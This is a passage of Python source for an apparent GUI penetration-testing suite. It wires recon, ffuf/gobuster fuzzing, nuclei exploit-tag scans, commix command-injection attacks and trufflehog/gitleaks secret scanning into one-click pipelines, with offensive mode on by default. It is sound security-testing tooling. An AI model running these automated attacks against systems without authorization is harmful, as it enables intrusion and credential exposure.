                if not path:
                    return
                entries = []
                for t in self._browser_txns:
                    entries.append({
                        'startedDateTime': t.get('time', ''),
                        'request': {'method': t.get('method', ''), 'url': t.get('url', ''),
                                    'headers': [{'name': k, 'value': str(vv)} for k, vv in (t.get('reqHeaders') or {}).items()],
                                    'postData': {'text': t.get('reqBody', '')} if t.get('reqBody') else {}},
                        'response': {'status': t.get('status') or 0,
                                     'headers': [{'name': k, 'value': str(vv)} for k, vv in (t.get('respHeaders') or {}).items()],
                                     'content': {'size': t.get('length') or 0, 'text': t.get('respBody', '')}},
                    })
                har = {'log': {'version': '1.2', 'creator': {'name': 'Blackthorn', 'version': '1'},
                               'entries': entries}}
                try:
                    with open(path, 'w', encoding='utf-8') as f:
                        _json.dump(har, f, indent=2, default=str)
                except Exception as e:
                    QMessageBox.warning(self, 'Export', f'Failed: {e}')

            # ---- wiring ----
            interceptor.captured.connect(_on_meta, Qt.QueuedConnection)
            wpage.consoleMsg.connect(_on_console, Qt.QueuedConnection)
            table.itemSelectionChanged.connect(_show_detail)
            table.itemDoubleClicked.connect(lambda *_: _expand())
            table.setContextMenuPolicy(Qt.CustomContextMenu)
            table.customContextMenuRequested.connect(_ctx_menu)
            issues_table.itemSelectionChanged.connect(_issue_selected)
            issues_table.setContextMenuPolicy(Qt.CustomContextMenu)
            issues_table.customContextMenuRequested.connect(_issue_ctx)
            isev_combo.currentIndexChanged.connect(_issues_refresh)
            isearch_edit.textChanged.connect(_issues_refresh)
            iscan_btn.clicked.connect(_scan_all_nuclei)
            iclear_btn.clicked.connect(_clear_issues)
            iexport_btn.clicked.connect(_export_issues)
            settings_btn.clicked.connect(_settings)
            export_btn.clicked.connect(_export)
            search_edit.textChanged.connect(_refresh)
            method_combo.currentIndexChanged.connect(_refresh)
            type_combo.currentIndexChanged.connect(_refresh)
            pause_btn.toggled.connect(lambda on: state.__setitem__('paused', on))
            clear_btn.clicked.connect(_clear)
            rep_btn.clicked.connect(_to_repeater)
            expand_btn.clicked.connect(_expand)
            url_edit.returnPressed.connect(_go)
            go_btn.clicked.connect(_go)
            back_btn.clicked.connect(view.back)
            fwd_btn.clicked.connect(view.forward)
            reload_btn.clicked.connect(view.reload)
            view.urlChanged.connect(lambda q: url_edit.setText(q.toString()))

            # Keep strong refs so nothing is garbage-collected while the page lives.
            self._browser_view = view
            self._browser_page = wpage
            self._browser_profile = profile
            self._browser_interceptor = interceptor
            self._browser_script_obj = locals().get('script')
            return page

        def _spawn_tool(self, page, cmd, on_stdout, on_finished, env_extra=None):
            """Run an external tool as a QProcess (merged stdout/stderr), streaming
            to on_stdout and calling on_finished(code) at the end. The proc is kept
            alive on self so it survives page switches."""
            from PySide6.QtCore import QProcess, QProcessEnvironment
            proc = QProcess(page)
            proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)
            env = QProcessEnvironment.systemEnvironment()
            env.insert('PYTHONIOENCODING', 'utf-8')
            env.insert('PYTHONUNBUFFERED', '1')
            for k, val in (env_extra or {}).items():
                env.insert(k, val)
            proc.setProcessEnvironment(env)
            proc.readyReadStandardOutput.connect(on_stdout)
            proc.finished.connect(on_finished)
            self._tool_procs = getattr(self, '_tool_procs', [])
            self._tool_procs.append(proc)
            proc.start(cmd[0], cmd[1:])
            # These tools take args, not stdin; give them EOF so they can never
            # block waiting for input (e.g. an un-batched interactive prompt).
            try:
                proc.closeWriteChannel()
            except Exception:
                pass
            return proc

        def _build_pipeline_page(self):
            """One-click chained pentest: Recon → content discovery → vuln scan →
            offensive (exploit-tag nuclei + commix), each phase auto-feeding the
            next. Offensive phases are gated and target only what you enter."""
            from PySide6 import QtWidgets
            from PySide6.QtWidgets import (QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
                QPushButton, QCheckBox, QPlainTextEdit, QTreeWidget, QTreeWidgetItem,
                QSplitter, QGroupBox, QGridLayout)
            from PySide6.QtCore import Qt
            from PySide6.QtGui import QBrush, QColor
            import json as _json
            import os as _os
            import tempfile

            page = QtWidgets.QWidget(); page.setObjectName('PipelinePage')
            v = QVBoxLayout(page); v.setContentsMargins(22, 20, 22, 20)
            hdr = QLabel('⛓  Pipeline — one-click chained pentest')
            hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
            v.addWidget(hdr)

            row = QHBoxLayout(); row.addWidget(QLabel('Target:'))
            target_edit = QLineEdit(); target_edit.setPlaceholderText('example.com')
            try:
                t = self.target_edit.text().strip()
                if t:
                    target_edit.setText(t)
            except Exception:
                pass
            row.addWidget(target_edit, 1); v.addLayout(row)

            box = QGroupBox('Phases (run top-to-bottom; each feeds the next)')
            pg = QGridLayout(box)
            recon_chk = QCheckBox('Recon  (subdomains · dns · httpx · tls · gau)'); recon_chk.setChecked(True)
            ffuf_chk = QCheckBox('Content discovery  (ffuf)'); ffuf_chk.setChecked(True)
            nuclei_chk = QCheckBox('Vuln scan  (nuclei)'); nuclei_chk.setChecked(True)
            cmdi_chk = QCheckBox('Command injection  (commix)  ⚠'); cmdi_chk.setChecked(True)
            offensive_chk = QCheckBox('Offensive mode — run real exploit checks/attacks'); offensive_chk.setChecked(True)
            offensive_chk.setStyleSheet('color:#ef4444; font-weight:bold;')
            pg.addWidget(recon_chk, 0, 0); pg.addWidget(ffuf_chk, 0, 1)
            pg.addWidget(nuclei_chk, 1, 0); pg.addWidget(cmdi_chk, 1, 1)
            pg.addWidget(offensive_chk, 2, 0, 1, 2)
            v.addWidget(box)

            warn = QLabel('⚠  Offensive phases launch real attacks (exploit templates, command-injection). '
                          'Only run against systems you are authorized to test.')
            warn.setStyleSheet('color:#f59e0b;'); warn.setWordWrap(True)
            v.addWidget(warn)

            brow = QHBoxLayout()
            run_btn = QPushButton('▶  Run Pipeline'); run_btn.setObjectName('PrimaryButton')
            stop_btn = QPushButton('■ Stop'); stop_btn.setEnabled(False)
            merge_btn = QPushButton('＋ Merge to Results'); merge_btn.setEnabled(False)
            tools_btn = QPushButton('⬇ Install tools')
            brow.addWidget(run_btn); brow.addWidget(stop_btn); brow.addWidget(merge_btn)
            brow.addStretch(); brow.addWidget(tools_btn)
            v.addLayout(brow)
            tools_btn.clicked.connect(lambda: self._download_tools_dialog(
                ['subfinder', 'dnsx', 'httpx', 'ffuf', 'nuclei', 'commix'],
                'Tools the pipeline chains together.', title='Install pipeline tools'))

            split = QSplitter(Qt.Vertical)
            tree = QTreeWidget()
            tree.setHeaderLabels(['Finding', 'Severity', 'Target', 'Detail'])
            tree.setColumnWidth(0, 220); tree.setColumnWidth(1, 80); tree.setColumnWidth(2, 280)
            split.addWidget(tree)
            log = QPlainTextEdit(); log.setReadOnly(True)
            log.setStyleSheet('font-family:Consolas,monospace; font-size:12px;')
            split.addWidget(log); split.setSizes([320, 220])
            v.addWidget(split, 1)

            ctx = {}
            pstate = {'running': False, 'plan': [], 'i': 0, 'buf': '', 'proc': None}

            def _log(s):
                log.appendPlainText(s.rstrip())

            def _add_finding(tech, target, sev, detail):
                f = {'category': 'pipeline', 'recon': True, 'bypass': False, 'technique': tech,
                     'target': str(target), 'severity': sev, 'reason': str(detail)}
                ctx.setdefault('findings', []).append(f)
                it = QTreeWidgetItem([tech, sev, str(target), str(detail)[:200]])
                col = {'HIGH': '#ef4444', 'MEDIUM': '#f59e0b', 'LOW': '#9aa5b5'}.get(sev)
                if col:
                    try:
                        it.setForeground(1, QBrush(QColor(col)))
                    except Exception:
                        pass
                tree.addTopLevelItem(it)

            def _norm(t):
                t = (t or '').strip()
                if '://' in t:
                    from urllib.parse import urlparse
                    t = urlparse(t).hostname or t
                return t

            # ---------- phase builders ----------
            def _mk_recon():
                host = _norm(target_edit.text())
                tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.json'); tmp.close()
                ctx['tmp_recon'] = tmp.name; ctx.setdefault('tmps', []).append(tmp.name)
                cmd = self._recon_worker_cmd(host, tmp.name, 120, 100, no_ports=True,
                                             opts={'max_hosts': 150, 'do_tls': True,
                                                   'do_historical': True, 'do_ports': False})
                return cmd, None

            def _done_recon(out):
                tmp = ctx.get('tmp_recon')
                data = []
                if tmp and _os.path.exists(tmp):
                    try:
                        with open(tmp, 'r', encoding='utf-8') as f:
                            data = _json.load(f)
                    except Exception:
                        data = []
                for f in (data if isinstance(data, list) else []):
                    _add_finding(f.get('technique', '?'), f.get('target', ''),
                                 f.get('severity', 'INFO'), f.get('reason', ''))
                    if f.get('technique') == 'HTTP Service':
                        u = f.get('target') or ''
                        if u.startswith('http'):
                            ctx.setdefault('live_urls', []).append(u)
                    if f.get('technique') in ('Historical URLs', 'Crawled Endpoints'):
                        for u in (f.get('urls') or f.get('endpoints') or [])[:1000]:
                            if '?' in u and '=' in u:
                                ctx.setdefault('param_urls', []).append(u)
                lu = list(dict.fromkeys(ctx.get('live_urls', [])))
                if not lu:
                    lu = ['https://' + _norm(target_edit.text())]
                ctx['live_urls'] = lu
                ctx['param_urls'] = list(dict.fromkeys(ctx.get('param_urls', [])))
                _log(f'  → {len(ctx["live_urls"])} live URL(s), {len(ctx["param_urls"])} parameterized URL(s)')

            def _mk_ffuf():
                import shutil
                if not shutil.which('ffuf'):
                    _log('  (ffuf not installed — skipping)'); return None, None
                from . import recon_install
                root = (ctx.get('live_urls') or ['https://' + _norm(target_edit.text())])[0].rstrip('/')
                wl = recon_install.ensure_builtin_wordlist()
                tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.json'); tmp.close()
                ctx['tmp_ffuf'] = tmp.name; ctx.setdefault('tmps', []).append(tmp.name)
                cmd = ['ffuf', '-w', wl, '-u', root + '/FUZZ', '-mc', '200,204,301,302,307,401,403',
                       '-t', '40', '-ac', '-of', 'json', '-o', tmp.name, '-s', '-noninteractive']
                return cmd, None

            def _done_ffuf(out):
                tmp = ctx.get('tmp_ffuf'); n = 0
                if tmp and _os.path.exists(tmp):
                    try:
                        with open(tmp, 'r', encoding='utf-8') as f:
                            for res in (_json.load(f).get('results') or []):
                                _add_finding('Content', res.get('url', ''), 'INFO',
                                             f"HTTP {res.get('status')} ({res.get('length')} bytes)")
                                n += 1
                    except Exception:
                        pass
                _log(f'  → {n} path(s)')

            def _mk_nuclei():
                import shutil
                if not shutil.which('nuclei'):
                    _log('  (nuclei not installed — skipping)'); return None, None
                urls = ctx.get('live_urls') or []
                if not urls:
                    return None, None
                lf = tempfile.NamedTemporaryFile('w', delete=False, suffix='.txt', encoding='utf-8')
                lf.write('\n'.join(urls)); lf.close(); ctx.setdefault('tmps', []).append(lf.name)
                cmd = ['nuclei', '-l', lf.name, '-jsonl', '-silent',
                       '-severity', 'low,medium,high,critical']
                if offensive_chk.isChecked():
                    cmd += ['-tags', 'cve,rce,sqli,lfi,ssrf,xxe,injection,exposure']
                return cmd, None

            def _done_nuclei(out):
                n = 0
                for line in out.splitlines():
                    line = line.strip()
                    if not line.startswith('{'):
                        continue
                    try:
                        o = _json.loads(line)
                    except Exception:
                        continue
                    info = o.get('info') or {}
                    sev = {'critical': 'HIGH', 'high': 'HIGH', 'medium': 'MEDIUM',
                           'low': 'LOW', 'info': 'INFO'}.get(str(info.get('severity', 'info')).lower(), 'INFO')
                    _add_finding(f"Vuln: {info.get('name', 'finding')}",
                                 o.get('matched-at') or o.get('host') or '', sev,
                                 info.get('severity', ''))
                    n += 1
                _log(f'  → {n} vuln finding(s)')

            def _mk_commix():
                from . import recon_install
                if not recon_install.is_installed('commix'):
                    _log('  (commix not installed — skipping)'); return None, None
                params = ctx.get('param_urls') or []
                if not params:
                    _log('  (no parameterized URLs to test)'); return None, None
                pre, env = recon_install.python_tool_cmd('commix')
                outdir = tempfile.mkdtemp(prefix='wp_commix_')
                ctx['commix_url'] = params[0]
                cmd = list(pre) + ['-u', params[0], '--batch', f'--output-dir={outdir}']
                return cmd, env

            def _done_commix(out):
                hit = False
                for line in out.splitlines():
                    low = line.lower()
                    if 'is vulnerable' in low or 'command injection' in low or 'injection point' in low:
                        _add_finding('Command Injection', ctx.get('commix_url', ''), 'HIGH',
                                     line.strip()[:160]); hit = True
                if not hit:
                    _log('  → no command injection confirmed')

            PHASES = {
                'recon': {'name': 'Recon', 'make': _mk_recon, 'done': _done_recon},
                'ffuf': {'name': 'Content discovery (ffuf)', 'make': _mk_ffuf, 'done': _done_ffuf},
                'nuclei': {'name': 'Vuln scan (nuclei)', 'make': _mk_nuclei, 'done': _done_nuclei},
                'commix': {'name': 'Command injection (commix)', 'make': _mk_commix, 'done': _done_commix},
            }

            # ---------- runner ----------
            def _finish():
                pstate['running'] = False
                run_btn.setEnabled(True); stop_btn.setEnabled(False)
                merge_btn.setEnabled(bool(ctx.get('findings')))
                for t in ctx.get('tmps', []):
                    try:
                        _os.unlink(t)
                    except Exception:
                        pass

            def _next():
                if not pstate['running']:
                    return
                i = pstate['i']
                if i >= len(pstate['plan']):
                    _log('\n══════ Pipeline complete ══════')
                    _finish(); return
                phase = pstate['plan'][i]
                try:
                    cmd, env = phase['make']()
                except Exception as e:
                    _log(f'[!] {phase["name"]}: {e}'); pstate['i'] += 1; _next(); return
                if not cmd:
                    pstate['i'] += 1; _next(); return
                _log(f'\n══ {phase["name"]} ══\n$ ' + ' '.join(str(c) for c in cmd) + '\n')
                pstate['buf'] = ''

                def _out():
                    p = pstate.get('proc')
                    if p:
                        d = bytes(p.readAllStandardOutput()).decode('utf-8', 'replace')
                        pstate['buf'] += d
                        log.appendPlainText(d.rstrip())

                def _fin(code=0, status=None):
                    try:
                        phase['done'](pstate['buf'])
                    except Exception as e:
                        _log(f'[!] {phase["name"]} parse error: {e}')
                    pstate['i'] += 1
                    _next()

                pstate['proc'] = self._spawn_tool(page, cmd, _out, _fin, env_extra=env)

            def _run():
                if pstate['running']:
                    return
                if not _norm(target_edit.text()):
                    _log('[!] enter a target first.')
                    return
                ctx.clear()
                tree.clear(); log.clear()
                plan = []
                if recon_chk.isChecked():
                    plan.append(PHASES['recon'])
                if ffuf_chk.isChecked():
                    plan.append(PHASES['ffuf'])
                if nuclei_chk.isChecked():
                    plan.append(PHASES['nuclei'])
                if cmdi_chk.isChecked() and offensive_chk.isChecked():
                    plan.append(PHASES['commix'])
                pstate.update({'running': True, 'plan': plan, 'i': 0, 'buf': ''})
                run_btn.setEnabled(False); stop_btn.setEnabled(True); merge_btn.setEnabled(False)
                _log(f'Pipeline: {len(plan)} phase(s) against {_norm(target_edit.text())} '
                     f'(offensive={"on" if offensive_chk.isChecked() else "off"})')
                _next()

            def _stop():
                pstate['running'] = False
                p = pstate.get('proc')
                if p:
                    try:
                        p.kill()
                    except Exception:
                        pass
                _log('\n[pipeline] stopped by user')
                _finish()

            def _merge():
                fs = ctx.get('findings') or []
                if fs:
                    self._results.extend(fs)
                    try:
                        self._refresh_tree_display()
                    except Exception:
                        pass
                    _log(f'[pipeline] merged {len(fs)} finding(s) into Results.')

            run_btn.clicked.connect(_run)
            stop_btn.clicked.connect(_stop)
            merge_btn.clicked.connect(_merge)
            return page

        def _build_fuzzer_page(self):
            """ffuf content discovery — dir/file/vhost/parameter fuzzing via FUZZ."""
            from PySide6 import QtWidgets
            from PySide6.QtWidgets import (QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
                QPushButton, QPlainTextEdit, QSpinBox, QCheckBox, QComboBox, QTableWidget,
                QTableWidgetItem, QSplitter, QHeaderView, QAbstractItemView, QFileDialog)
            from PySide6.QtCore import Qt
            import shutil
            import tempfile
            import json as _json
            import os as _os
            import re as _re

            page = QtWidgets.QWidget(); page.setObjectName('FuzzerPage')
            v = QVBoxLayout(page); v.setContentsMargins(22, 20, 22, 20)
            hdr = QLabel('⌗  Fuzzer — ffuf content discovery')
            hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
            v.addWidget(hdr)
            v.addWidget(QLabel('Put the FUZZ marker in the URL (or a header). '
                               'e.g.  https://target/FUZZ   ·   https://target/api?FUZZ=1   ·   Host: FUZZ.target.com'))

            row = QHBoxLayout(); row.addWidget(QLabel('URL:'))
            url_edit = QLineEdit(); url_edit.setPlaceholderText('https://target/FUZZ')
            try:
                t = self.target_edit.text().strip()
                if t:
                    url_edit.setText(t.rstrip('/') + '/FUZZ')
            except Exception:
                pass
            row.addWidget(url_edit, 1); v.addLayout(row)

            wrow = QHBoxLayout(); wrow.addWidget(QLabel('Wordlist:'))
            wl_edit = QLineEdit(); wl_edit.setPlaceholderText('(built-in common.txt used if blank)')
            browse_btn = QPushButton('Browse')
            wrow.addWidget(wl_edit, 1); wrow.addWidget(browse_btn); v.addLayout(wrow)

            hdr_edit = QPlainTextEdit(); hdr_edit.setMaximumHeight(56)
            hdr_edit.setPlaceholderText('extra headers (optional, FUZZ allowed) — e.g.  Host: FUZZ.target.com')
            v.addWidget(hdr_edit)

            orow = QHBoxLayout()
            orow.addWidget(QLabel('Engine:'))
            engine_combo = QComboBox(); engine_combo.addItems(['ffuf', 'feroxbuster', 'gobuster'])
            engine_combo.setToolTip('ffuf uses the FUZZ marker; feroxbuster/gobuster append the wordlist to the base URL.')
            orow.addWidget(engine_combo)
            orow.addWidget(QLabel('Match codes:'))
            mc_edit = QLineEdit('200,204,301,302,307,401,403,405,500'); mc_edit.setMaximumWidth(240)
            orow.addWidget(mc_edit)
            orow.addWidget(QLabel('Threads:'))
            th_spin = QSpinBox(); th_spin.setRange(1, 200); th_spin.setValue(40); orow.addWidget(th_spin)
            ac_chk = QCheckBox('Auto-calibrate'); ac_chk.setChecked(True)
            orow.addWidget(ac_chk); orow.addStretch(); v.addLayout(orow)

            brow = QHBoxLayout()
            run_btn = QPushButton('▶ Run'); stop_btn = QPushButton('■ Stop'); stop_btn.setEnabled(False)
            tools_btn = QPushButton('⬇ Install engines')
            brow.addWidget(run_btn); brow.addWidget(stop_btn); brow.addStretch(); brow.addWidget(tools_btn)
            v.addLayout(brow)
            browse_btn.clicked.connect(
                lambda: (lambda p: wl_edit.setText(p) if p else None)(QFileDialog.getOpenFileName(self, 'Wordlist')[0]))
            tools_btn.clicked.connect(lambda: self._download_tools_dialog(
                ['ffuf', 'feroxbuster', 'gobuster'], 'Content-discovery engines.', title='Install fuzzing engines'))

            split = QSplitter(Qt.Vertical)
            table = QTableWidget(0, 6)
            table.setHorizontalHeaderLabels(['Status', 'Length', 'Words', 'Lines', 'Input', 'URL'])
            table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
            table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
            table.setSortingEnabled(True)
            try:
                table.horizontalHeader().setSectionResizeMode(5, QHeaderView.ResizeMode.Stretch)
            except Exception:
                pass
            split.addWidget(table)
            log = QPlainTextEdit(); log.setReadOnly(True); log.setMaximumHeight(140)
            log.setStyleSheet('font-family:Consolas,monospace; font-size:12px;')
            split.addWidget(log); split.setSizes([360, 140]); v.addWidget(split, 1)

            st = {'proc': None, 'tmp': None, 'engine': 'ffuf', 'base': ''}
            _GOB_RE = _re.compile(r'^(\S+)\s+\(Status:\s*(\d+)\)(?:\s*\[Size:\s*(\d+)\])?')

            def _ap(s):
                log.appendPlainText(s.rstrip())

            def _num(n):
                it = QTableWidgetItem()
                try:
                    it.setData(Qt.ItemDataRole.DisplayRole, int(n))
                except Exception:
                    it.setText(str(n))
                return it

            def _add_row(status, length, words, lines, inp, url):
                table.setSortingEnabled(False)
                r = table.rowCount(); table.insertRow(r)
                table.setItem(r, 0, _num(status)); table.setItem(r, 1, _num(length))
                table.setItem(r, 2, _num(words)); table.setItem(r, 3, _num(lines))
                table.setItem(r, 4, QTableWidgetItem(str(inp)))
                table.setItem(r, 5, QTableWidgetItem(str(url)))
                table.setSortingEnabled(True)

            def _on_out():
                p = st['proc']
                if not p:
                    return
                txt = bytes(p.readAllStandardOutput()).decode('utf-8', 'replace')
                eng = st['engine']
                if eng == 'ffuf':
                    _ap(txt)   # ffuf results parsed from temp JSON on finish
                    return
                for line in txt.splitlines():
                    line = line.rstrip()
                    if not line:
                        continue
                    if eng == 'feroxbuster' and line.lstrip().startswith('{'):
                        try:
                            obj = _json.loads(line)
                        except Exception:
                            _ap(line); continue
                        if obj.get('type') == 'response':
                            url = obj.get('url', '')
                            _add_row(obj.get('status', 0), obj.get('content_length', 0),
                                     obj.get('word_count', 0), obj.get('line_count', 0),
                                     url.rstrip('/').rsplit('/', 1)[-1], url)
                        continue
                    if eng == 'gobuster':
                        m = _GOB_RE.match(line.strip())
                        if m:
                            path, code_, size = m.group(1), m.group(2), (m.group(3) or 0)
                            _add_row(code_, size, 0, 0, path, st.get('base', '') + path.lstrip('/'))
                            continue
                    _ap(line)

            def _on_fin(code=0, status=None):
                run_btn.setEnabled(True); stop_btn.setEnabled(False)
                if st['engine'] == 'ffuf':
                    tmp = st['tmp']
                    if tmp and _os.path.exists(tmp):
                        try:
                            with open(tmp, 'r', encoding='utf-8') as f:
                                data = _json.load(f)
                            for res in (data.get('results') or []):
                                inp = res.get('input') or {}
                                _add_row(res.get('status', 0), res.get('length', 0),
                                         res.get('words', 0), res.get('lines', 0),
                                         inp.get('FUZZ', '') if isinstance(inp, dict) else str(inp),
                                         res.get('url', ''))
                        except Exception as e:
                            _ap(f'[!] parse error: {e}')
                        finally:
                            try:
                                _os.unlink(tmp)
                            except Exception:
                                pass
                _ap(f'\n[{st["engine"]}] finished (exit {code}) — {table.rowCount()} hit(s)')

            def _run():
                from . import recon_install
                eng = engine_combo.currentText(); st['engine'] = eng
                if not shutil.which(eng):
                    self._download_tools_dialog([eng], f'{eng} is the selected fuzzing engine.',
                                                title=f'Install {eng}')
                    if not shutil.which(eng):
                        return
                u = url_edit.text().strip()
                wl = wl_edit.text().strip() or recon_install.ensure_builtin_wordlist()
                if not _os.path.exists(wl):
                    _ap(f'[!] wordlist not found: {wl}')
                    return
                headers = [ln.strip() for ln in hdr_edit.toPlainText().splitlines()
                           if ':' in ln and ln.split(':', 1)[0].strip()]
                th = str(th_spin.value()); mc = mc_edit.text().strip() or 'all'
                table.setRowCount(0); log.clear()
                if eng == 'ffuf':
                    if 'FUZZ' not in (u + hdr_edit.toPlainText()):
                        _ap('[!] ffuf needs the FUZZ marker in the URL or a header.')
                        return
                    tmpf = tempfile.NamedTemporaryFile(delete=False, suffix='.json'); tmpf.close()
                    st['tmp'] = tmpf.name
                    cmd = ['ffuf', '-w', wl, '-u', u, '-mc', mc, '-t', th,
                           '-of', 'json', '-o', tmpf.name, '-s', '-noninteractive']
                    if ac_chk.isChecked():
                        cmd.append('-ac')
                    for h in headers:
                        cmd += ['-H', h]
                else:
                    base = u.replace('/FUZZ', '').replace('FUZZ', '').rstrip('/')
                    if not base:
                        _ap('[!] enter a base URL (feroxbuster/gobuster append the wordlist).')
                        return
                    st['base'] = base + '/'
                    if eng == 'feroxbuster':
                        cmd = ['feroxbuster', '-u', base, '-w', wl, '--json', '--silent', '-t', th]
                    else:  # gobuster
                        cmd = ['gobuster', 'dir', '-u', base, '-w', wl, '-q', '--no-error', '-t', th]
                    for h in headers:
                        cmd += ['-H', h]
                _ap('$ ' + ' '.join(cmd) + '\n')
                run_btn.setEnabled(False); stop_btn.setEnabled(True)
                st['proc'] = self._spawn_tool(page, cmd, _on_out, _on_fin)

            def _stop():
                if st['proc']:
                    st['proc'].kill(); _ap(f'\n[{st["engine"]}] stopped')
            run_btn.clicked.connect(_run); stop_btn.clicked.connect(_stop)
            return page

        def _build_secrets_page(self):
            """trufflehog — scan a git repo or local path for leaked credentials."""
            from PySide6 import QtWidgets
            from PySide6.QtWidgets import (QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
                QPushButton, QPlainTextEdit, QComboBox, QCheckBox, QTableWidget,
                QTableWidgetItem, QSplitter, QHeaderView, QAbstractItemView, QFileDialog)
            from PySide6.QtCore import Qt
            from PySide6.QtGui import QBrush, QColor
            import shutil
            import json as _json
            import os as _os

            page = QtWidgets.QWidget(); page.setObjectName('SecretsPage')
            v = QVBoxLayout(page); v.setContentsMargins(22, 20, 22, 20)
            hdr = QLabel('⚷  Secrets — trufflehog')
            hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
            v.addWidget(hdr)
            v.addWidget(QLabel('Scan a git repo (clone URL) or a local folder for leaked & verified '
                               'API keys / tokens / credentials.  Git mode needs git on PATH.'))

            row = QHBoxLayout()
            row.addWidget(QLabel('Engine:'))
            engine_combo = QComboBox(); engine_combo.addItems(['trufflehog', 'gitleaks'])
            engine_combo.setToolTip('trufflehog: git URL or path (verifies live secrets). gitleaks: local path/repo.')
            row.addWidget(engine_combo)
            mode_combo = QComboBox(); mode_combo.addItems(['Git repo URL', 'Filesystem path'])
            row.addWidget(mode_combo)
            target_edit = QLineEdit()
            target_edit.setPlaceholderText('https://github.com/org/repo.git   or   C:\\path\\to\\code')
            browse_btn = QPushButton('Browse')
            row.addWidget(target_edit, 1); row.addWidget(browse_btn); v.addLayout(row)

            orow = QHBoxLayout()
            verified_chk = QCheckBox('Only verified secrets (trufflehog)')
            run_btn = QPushButton('▶ Run'); stop_btn = QPushButton('■ Stop'); stop_btn.setEnabled(False)
            tools_btn = QPushButton('⬇ Install engines')
            orow.addWidget(verified_chk); orow.addStretch()
            orow.addWidget(run_btn); orow.addWidget(stop_btn); orow.addWidget(tools_btn)
            v.addLayout(orow)
            browse_btn.clicked.connect(
                lambda: (lambda p: target_edit.setText(p) if p else None)(
                    QFileDialog.getExistingDirectory(self, 'Folder to scan')))
            tools_btn.clicked.connect(lambda: self._download_tools_dialog(
                ['trufflehog', 'gitleaks'], 'Secret-scanning engines.', title='Install secret scanners'))

            split = QSplitter(Qt.Vertical)
            table = QTableWidget(0, 4)
            table.setHorizontalHeaderLabels(['Detector', 'Verified', 'Location', 'Secret'])
            table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
            table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
            table.setSortingEnabled(True)
            try:
                table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
            except Exception:
                pass
            split.addWidget(table)
            log = QPlainTextEdit(); log.setReadOnly(True); log.setMaximumHeight(120)
            log.setStyleSheet('font-family:Consolas,monospace; font-size:12px;')
            split.addWidget(log); split.setSizes([380, 120]); v.addWidget(split, 1)

            st = {'proc': None, 'buf': '', 'count': 0, 'engine': 'trufflehog', 'tmp': None}

            def _ap(s):
                log.appendPlainText(s.rstrip())

            def _add(detector, verified, loc, secret):
                r = table.rowCount(); table.insertRow(r)
                table.setItem(r, 0, QTableWidgetItem(detector))
                vi = QTableWidgetItem('✓ verified' if verified else '—')
                if verified:
                    vi.setForeground(QBrush(QColor('#ef4444')))
                table.setItem(r, 1, vi)
                table.setItem(r, 2, QTableWidgetItem(loc))
                table.setItem(r, 3, QTableWidgetItem(secret))

            def _consume(line):
                line = line.strip()
                if not line:
                    return
                if not line.startswith('{'):
                    _ap(line)
                    return
                try:
                    obj = _json.loads(line)
                except Exception:
                    return
                det = obj.get('DetectorName') or obj.get('detector_name') or '?'
                ver = bool(obj.get('Verified') or obj.get('verified'))
                raw = (obj.get('Raw') or obj.get('raw') or '')[:90]
                loc = ''
                meta = ((obj.get('SourceMetadata') or {}).get('Data')) or {}
                for k in ('Git', 'Filesystem', 'Github', 'Gitlab'):
                    d = meta.get(k) or {}
                    if d:
                        loc = str(d.get('file', '') or d.get('repository', ''))
                        if d.get('line'):
                            loc += f":{d.get('line')}"
                        if d.get('commit'):
                            loc += f" @{str(d.get('commit'))[:8]}"
                        break
                _add(det, ver, loc, raw)
                st['count'] += 1

            def _on_out():
                p = st['proc']
                if not p:
                    return
                chunk = bytes(p.readAllStandardOutput()).decode('utf-8', 'replace')
                if st['engine'] == 'gitleaks':
                    _ap(chunk)   # gitleaks results parsed from its JSON report on finish
                    return
                st['buf'] += chunk
                while '\n' in st['buf']:
                    line, st['buf'] = st['buf'].split('\n', 1)
                    _consume(line)

            def _on_fin(code=0, status=None):
                if st['engine'] == 'trufflehog':
                    if st['buf'].strip():
                        _consume(st['buf']); st['buf'] = ''
                else:  # gitleaks JSON report
                    tmp = st.get('tmp')
                    if tmp and _os.path.exists(tmp):
                        try:
                            with open(tmp, 'r', encoding='utf-8') as f:
                                for g in (_json.load(f) or []):
                                    loc = str(g.get('File', ''))
                                    if g.get('StartLine'):
                                        loc += f":{g.get('StartLine')}"
                                    _add(g.get('RuleID') or g.get('Description') or 'secret',
                                         False, loc, (g.get('Secret') or g.get('Match') or '')[:90])
                                    st['count'] += 1
                        except Exception as e:
                            _ap(f'[!] gitleaks parse error: {e}')
                        finally:
                            try:
                                _os.unlink(tmp)
                            except Exception:
                                pass
                run_btn.setEnabled(True); stop_btn.setEnabled(False)
                _ap(f'\n[{st["engine"]}] finished (exit {code}) — {st["count"]} secret(s)')

            def _run():
                import tempfile
                eng = engine_combo.currentText(); st['engine'] = eng
                if not shutil.which(eng):
                    self._download_tools_dialog([eng], f'{eng} is the selected secret scanner.',
                                                title=f'Install {eng}')
                    if not shutil.which(eng):
                        return
                tgt = target_edit.text().strip()
                if not tgt:
                    _ap('[!] enter a git URL or folder path.')
                    return
                table.setRowCount(0); log.clear(); st['buf'] = ''; st['count'] = 0; st['tmp'] = None
                if eng == 'trufflehog':
                    sub = 'git' if mode_combo.currentIndex() == 0 else 'filesystem'
                    cmd = ['trufflehog', sub, tgt, '--json', '--no-update']
                    if verified_chk.isChecked():
                        cmd.append('--only-verified')
                else:  # gitleaks — scans a local path/repo
                    tmpf = tempfile.NamedTemporaryFile(delete=False, suffix='.json'); tmpf.close()
                    st['tmp'] = tmpf.name
                    sub = 'git' if mode_combo.currentIndex() == 0 else 'dir'
                    if mode_combo.currentIndex() == 0 and '://' in tgt:
                        _ap('[!] gitleaks scans local paths — give a folder, or use trufflehog for remote URLs.')
